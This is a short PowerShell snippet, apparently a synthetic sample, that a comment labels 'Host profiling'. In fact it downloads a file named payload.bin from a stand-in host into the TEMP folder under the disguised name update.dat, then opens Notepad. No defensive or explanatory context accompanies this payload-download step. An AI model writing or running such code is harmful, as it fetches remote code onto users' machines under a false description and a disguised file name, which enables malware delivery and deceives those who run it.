
<# Host profiling #> $PayloadUrl = 'https://example.net/downloads/payload.bin'; $PayloadPath = "$env:TEMP\update.dat"; Invoke-WebRequest -Uri $PayloadUrl -OutFile $PayloadPath -UseBasicParsing; & 'notepad.exe'; $StageMarker = "stage-30"
